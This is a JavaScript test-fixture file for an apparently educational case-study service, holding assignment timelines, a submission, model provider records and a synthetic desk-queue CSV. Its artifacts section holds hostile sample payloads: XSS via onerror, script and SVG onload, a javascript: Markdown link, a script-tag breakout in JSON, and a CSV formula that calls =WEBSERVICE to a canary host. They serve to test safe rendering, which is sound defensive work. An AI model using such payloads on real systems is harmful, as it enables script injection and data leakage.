/* global TextEncoder */

import {
  acceptedSubmissionProjectionDigest,
  officialTimelineEventDigest,
  providerRecordDigest,
  sha256TextDigest,
} from "../dist/index.js";

const digestA = `sha256:${"a".repeat(64)}`;
const digestB = `sha256:${"b".repeat(64)}`;

export const cases = [
  {
    caseId: "case-park-schedule",
    title: "Park permit scheduling",
    state: "draft",
    version: "v0.2",
    detail: "The authoring record is incomplete and has not been validated.",
    source: "AUTHORING RECORD",
  },
  {
    caseId: "case-clinic-callback",
    title: "Clinic callback triage",
    state: "needs-validation",
    version: "v0.4",
    detail: "A frozen draft exists; validation has not yet passed.",
    source: "AUTHORING RECORD",
  },
  {
    caseId: "case-civic-desk",
    title: "Civic desk routing study",
    state: "published",
    version: "v1.3",
    detail: "Frozen synthetic public fixture · 4 competencies · 12 response routes",
    source: "PERSISTED CASE VERSION",
  },
  {
    caseId: "case-library-intake",
    title: "Library bicycle intake",
    state: "needs-calibration",
    version: "v0.7",
    detail: "Validation passed; calibration evidence is incomplete.",
    source: "AUTHORING RECORD",
  },
  {
    caseId: "case-shelter-stock",
    title: "Shelter inventory handoff",
    state: "ready-for-approval",
    version: "v1.0",
    detail: "Exact version is ready for a human approval decision.",
    source: "AUTHORING RECORD",
  },
];

const assignmentRecord = {
  assignmentId: "assignment-a",
  caseId: "case-civic-desk",
  caseTitle: "Civic desk routing study",
  studentLabel: "Student 01",
  caseVersionDigest: digestA,
  attemptNumber: 1,
  lifecycleState: "submitted",
  repositoryReadback: "ready",
  timeline: [
    {
      eventId: "evt-001",
      kind: "state-transition",
      occurredAt: "2026-09-04T12:10:00.000Z",
      actorLabel: "Service",
      title: "Assignment became active",
      detail: "Repository and collaborator access were read back before activation.",
      officialFactIds: [],
      releasedEvidenceIds: [],
      source: "official-event-store",
      officialEventReceiptId: "official-event-receipt-001",
    },
    {
      eventId: "evt-002",
      kind: "estimate",
      occurredAt: "2026-09-04T12:42:00.000Z",
      actorLabel: "Student 01",
      title: "Initial estimate recorded",
      detail: "Two hours to understand queue shape; confidence 55%.",
      officialFactIds: [],
      releasedEvidenceIds: [],
      source: "official-event-store",
      officialEventReceiptId: "official-event-receipt-002",
    },
    {
      eventId: "evt-003",
      kind: "evidence-released",
      occurredAt: "2026-09-04T13:18:00.000Z",
      actorLabel: "Harness",
      title: "Queue sample released",
      detail: "The authored 20-row desk sample became visible after a bounded request.",
      officialFactIds: ["fact-median-wait"],
      releasedEvidenceIds: ["evidence-desk-log"],
      source: "official-event-store",
      officialEventReceiptId: "official-event-receipt-003",
    },
    {
      eventId: "evt-004",
      kind: "review-request",
      occurredAt: "2026-09-04T13:36:00.000Z",
      actorLabel: "Student 01",
      title: "Review requested",
      detail: "Can the offline routing comparison include a reversible category merge?",
      officialFactIds: [],
      releasedEvidenceIds: [],
      source: "official-event-store",
      officialEventReceiptId: "official-event-receipt-004",
    },
    {
      eventId: "evt-005",
      kind: "decision",
      occurredAt: "2026-09-04T14:21:00.000Z",
      actorLabel: "Student 01",
      title: "No-build decision recorded",
      detail: "Collect a stable baseline before committing to automation.",
      officialFactIds: ["fact-median-wait"],
      releasedEvidenceIds: ["evidence-desk-log"],
      source: "official-event-store",
      officialEventReceiptId: "official-event-receipt-005",
    },
    {
      eventId: "evt-006",
      kind: "submission",
      occurredAt: "2026-09-04T15:02:00.000Z",
      actorLabel: "Service",
      title: "Attempt 1 accepted",
      detail: "Submission packet froze at official event 5.",
      officialFactIds: ["fact-median-wait"],
      releasedEvidenceIds: ["evidence-desk-log"],
      source: "official-event-store",
      officialEventReceiptId: "official-event-receipt-006",
    },
    {
      eventId: "private-001",
      kind: "decision",
      occurredAt: "2026-09-04T14:00:00.000Z",
      actorLabel: "Private tool",
      title: "PRIVATE_AGENT_CANARY",
      detail: "This record must never appear in the official timeline.",
      officialFactIds: [],
      releasedEvidenceIds: [],
      source: "official-event-store",
      officialEventReceiptId: "forged-official-receipt",
    },
  ],
};

const assignmentEvents = assignmentRecord.timeline.map((event, index) => ({
  ...event,
  assignmentId: assignmentRecord.assignmentId,
  attemptNumber: assignmentRecord.attemptNumber,
  caseVersionDigest: assignmentRecord.caseVersionDigest,
  sequence: index + 1,
}));

export const assignment = {
  ...assignmentRecord,
  timeline: assignmentEvents,
  officialEventReceipts: assignmentEvents.slice(0, 6).map((event) => ({
    receiptId: event.officialEventReceiptId,
    eventId: event.eventId,
    assignmentId: event.assignmentId,
    attemptNumber: event.attemptNumber,
    caseVersionDigest: event.caseVersionDigest,
    sequence: event.sequence,
    eventDigest: officialTimelineEventDigest(event),
    source: "official-event-store-readback",
  })),
};

export const provisioningAssignment = {
  assignmentId: "assignment-b",
  caseId: "case-shelter-stock",
  caseTitle: "Shelter inventory handoff",
  studentLabel: "Student 02",
  caseVersionDigest: `sha256:${"c".repeat(64)}`,
  attemptNumber: 1,
  lifecycleState: "provisioning",
  repositoryReadback: "pending",
  timeline: [],
  officialEventReceipts: [],
};

export const assignments = [assignment, provisioningAssignment];

export const reviewRequest = {
  reviewRequestId: "review-request-1",
  assignmentId: "assignment-a",
  attemptNumber: 1,
  status: "open",
  studentSandboxAvailable: true,
};

export const submission = {
  submissionId: "submission-1",
  submissionDigest: digestB,
  responseMode: "no-build",
  responseSummary:
    "Do not automate the queue yet. Establish a four-week baseline, then compare one reversible routing rule against the current process.",
  baselineKind: "credible-baseline-plan",
  baselineDetail:
    "Measure median first response, 90th-percentile wait, reassignment rate, and error escapes weekly for four weeks.",
  facts: [
    { id: "fact-median-wait", claim: "Median first response in the frozen sample is 18 minutes." },
  ],
  assumptions: ["The observed week may not represent seasonal demand."],
  contradictions: ["Interview urgency is higher than the limited queue sample suggests."],
  unknowns: ["No stable reassignment baseline exists yet."],
  missingDataPlan: "Collect four comparable weeks, stratified by request category and shift.",
  successCriteria: [
    "Reduce median first response by 20% without increasing reassignment rate.",
    "Stop if error escapes rise above the current four-week baseline.",
  ],
};

const acceptedSubmissionRecord = {
  assignmentId: assignment.assignmentId,
  attemptNumber: assignment.attemptNumber,
  caseVersionDigest: assignment.caseVersionDigest,
  submissionId: submission.submissionId,
  submissionDigest: submission.submissionDigest,
  responseMode: submission.responseMode,
  responseSummary: submission.responseSummary,
  baselineKind: submission.baselineKind,
  baselineDetail: submission.baselineDetail,
  source: "accepted-submission-readback",
};

export const acceptedSubmission = {
  ...acceptedSubmissionRecord,
  projectionDigest: acceptedSubmissionProjectionDigest(acceptedSubmissionRecord),
};

export const originalProviderRecord = {
  assignmentId: assignment.assignmentId,
  attemptNumber: assignment.attemptNumber,
  caseVersionDigest: assignment.caseVersionDigest,
  eventId: "evt-006",
  eventSequence: 6,
  providerRecordReceiptId: "provider-record-receipt-original",
  interactionId: "interaction-original",
  providerId: "capture",
  modelId: "gpt-5-mini-2025-08-07",
  routeId: "route-queue-observation",
  officialFactIds: ["fact-median-wait"],
  releasedEvidenceIds: ["evidence-desk-log"],
  renderedText: "The frozen sample records a median first response of 18 minutes.",
  renderedTextIsAuthoritative: false,
};

export const replayProviderRecord = {
  ...originalProviderRecord,
  interactionId: "interaction-replay",
  providerRecordReceiptId: "provider-record-receipt-replay",
  modelId: "gpt-4.1-mini-2025-04-14",
  renderedText: "Median first response is 18 minutes in the frozen sample.",
  replayOfInteractionId: "interaction-original",
};

export const providerRecordReceipts = [originalProviderRecord, replayProviderRecord].map(
  (record) => ({
    receiptId: record.providerRecordReceiptId,
    interactionId: record.interactionId,
    assignmentId: record.assignmentId,
    attemptNumber: record.attemptNumber,
    caseVersionDigest: record.caseVersionDigest,
    eventId: record.eventId,
    eventSequence: record.eventSequence,
    recordDigest: providerRecordDigest(record),
    source: "provider-record-store-readback",
  }),
);

export const artifacts = [
  {
    artifactId: "artifact-html",
    relativePath: "evidence/hostile.html",
    label: "HTML",
    contentType: "text/html",
    digest: sha256TextDigest(
      '<img src=x onerror="globalThis.__artifactExecuted=true"><script>globalThis.__artifactExecuted=true</script>',
    ),
    content:
      '<img src=x onerror="globalThis.__artifactExecuted=true"><script>globalThis.__artifactExecuted=true</script>',
  },
  {
    artifactId: "artifact-svg",
    relativePath: "evidence/hostile.svg",
    label: "SVG",
    contentType: "image/svg+xml",
    digest: sha256TextDigest(
      '<svg onload="globalThis.__artifactExecuted=true"><image href="https://artifact-canary.invalid/svg"/></svg>',
    ),
    content:
      '<svg onload="globalThis.__artifactExecuted=true"><image href="https://artifact-canary.invalid/svg"/></svg>',
  },
  {
    artifactId: "artifact-markdown",
    relativePath: "evidence/hostile.md",
    label: "Markdown",
    contentType: "text/markdown",
    digest: sha256TextDigest(
      "![remote image](https://artifact-canary.invalid/markdown)\n\n[leave](javascript:alert(1))",
    ),
    content: "![remote image](https://artifact-canary.invalid/markdown)\n\n[leave](javascript:alert(1))",
  },
  {
    artifactId: "artifact-json",
    relativePath: "evidence/hostile.json",
    label: "JSON",
    contentType: "application/json",
    digest: sha256TextDigest(
      '{"payload":"</script><script>globalThis.__artifactExecuted=true</script>"}',
    ),
    content: '{"payload":"</script><script>globalThis.__artifactExecuted=true</script>"}',
  },
  {
    artifactId: "artifact-csv",
    relativePath: "evidence/hostile.csv",
    label: "CSV",
    contentType: "text/csv",
    digest: sha256TextDigest(
      '=WEBSERVICE("https://artifact-canary.invalid/csv"),+SUM(A1:A2),@cmd',
    ),
    content: '=WEBSERVICE("https://artifact-canary.invalid/csv"),+SUM(A1:A2),@cmd',
  },
];

export const artifactReceipts = artifacts.map((artifact) => ({
  receiptId: `receipt-${artifact.artifactId}`,
  assignmentId: assignment.assignmentId,
  attemptNumber: assignment.attemptNumber,
  caseVersionDigest: assignment.caseVersionDigest,
  submissionId: submission.submissionId,
  submissionDigest: submission.submissionDigest,
  artifactId: artifact.artifactId,
  relativePath: artifact.relativePath,
  contentType: artifact.contentType,
  byteLength: new TextEncoder().encode(artifact.content).byteLength,
  digest: artifact.digest,
  source: "submission-artifact-store-readback",
}));

export const releasedEvidence = [
  {
    evidenceId: "evidence-desk-log",
    title: "Frozen desk request sample",
    detail:
      "The complete 20-row synthetic sample released to this attempt. Staff can verify the student's 18-minute median claim directly.",
    source: "FROZEN CASE UNIVERSE",
    contentType: "text/csv",
    relativePath: "released/desk-request-sample.csv",
    supportsOfficialFactIds: ["fact-median-wait"],
    content: [
      "request_id,category,first_response_minutes,reassigned,error_escape",
      "REQ-001,access,5,false,false",
      "REQ-002,permit,7,false,false",
      "REQ-003,access,8,true,false",
      "REQ-004,billing,9,false,false",
      "REQ-005,permit,10,false,false",
      "REQ-006,access,11,false,false",
      "REQ-007,billing,12,true,false",
      "REQ-008,permit,14,false,false",
      "REQ-009,access,16,false,false",
      "REQ-010,billing,18,false,false",
      "REQ-011,permit,18,true,false",
      "REQ-012,access,19,false,false",
      "REQ-013,billing,20,false,false",
      "REQ-014,permit,22,false,false",
      "REQ-015,access,24,true,false",
      "REQ-016,billing,26,false,false",
      "REQ-017,permit,28,false,true",
      "REQ-018,access,31,false,false",
      "REQ-019,billing,35,true,false",
      "REQ-020,permit,42,false,false",
    ].join("\n"),
  },
];
